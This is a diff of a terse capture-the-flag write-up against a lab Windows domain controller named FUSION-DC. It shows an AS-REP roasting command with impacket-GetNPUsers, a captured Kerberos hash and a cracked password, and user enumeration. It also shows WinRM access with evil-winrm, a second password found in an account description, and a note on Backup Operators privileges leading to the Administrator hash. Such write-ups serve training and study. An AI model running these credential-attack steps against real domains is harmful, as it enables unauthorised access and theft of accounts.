@@ -99,29 +99,21 @@ TCP Sequence Prediction: Difficulty=254 (Good luck!)
 IP ID Sequence Generation: Incremental
 Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-
 I found this subdomain:
-
 ```Bash
 /backup
 ```
-
 And we found employee.ods. So, open it. We have username for the next attack
-
 ```Bash
 impacket-GetNPUsers fusion.corp/ -dc-ip $target -usersfile user.txt -format hashcat -outputfile hashes.txt
 ```
-
 ```Bash
 $krb5asrep$23$lparker@FUSION.CORP:19cb5448f9087e3626823098b5da5e7b$a958a800890da66650a1a898b393378ad16c66946fd79091fc412f8fda32510f1c131cb20ab3cc97601b4becd33a164aa7406a813ab15ce4481b1d6352769ccca7ea47bb0595da0d995df8648c75eddc8e68764d5133bd5b74bb10ed15c61fa60aabbdcec4356d5c9e7b0418749a2bee57edf127644d41cdff2798204825e29c8e19dab0fe54e362f6478d72cf52e91a35b4fc1a4927006024dc3d8efdb05b52594f76323ad635e3e138b04aa974038855a6a33731250a4f6fdfa1c8a0e1163332242620df360faf905717f2b7a2ddeab6a8e2a2ea7a3eb4700aa5ca46047dd5f2076aa37bbd6f254579
 ```
-
 ```Bash
 lparker:!!abbylvzsvs2k6!
 ```
-
 SID:
-
 ```Bash
 500: FUSION\Administrator (SidTypeUser)
 501: FUSION\Guest (SidTypeUser)
@@ -130,13 +122,10 @@ SID:
 1103: FUSION\lparker (SidTypeUser)
 1104: FUSION\jmurphy (SidTypeUser)
 ```
-
 Tried with evil-winrm, boom:
-
 ```Bash
 C:\Users\lparker\Documents> Get-ADUser -Filter * -Properties * | Select-Object SamAccountName, Description
 ```
-
 ```Bash
 SamAccountName Description
 -------------- -----------
@@ -146,21 +135,15 @@ krbtgt         Key Distribution Center Service Account
 lparker
 jmurphy        Password set to u8WC3!kLsgw=\#bRY
 ```
-
 Or tried with netexec --users, we have same answer
-
 ```Bash
 WINRM       10.201.119.198  5985   FUSION-DC        [+] fusion.corp\jmurphy:u8WC3!kLsgw=\#bRY (Pwn3d!
 ```
-
 So, winrm is enable. Use evil-winrm
-
 Oh, we have backup permission
-
 ```Bash
 BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
 SeBackupPrivilege             Back up files and directories  Enabled
 SeRestorePrivilege            Restore files and directories  Enabled
 ```
-
 Done, I have hash Administrator
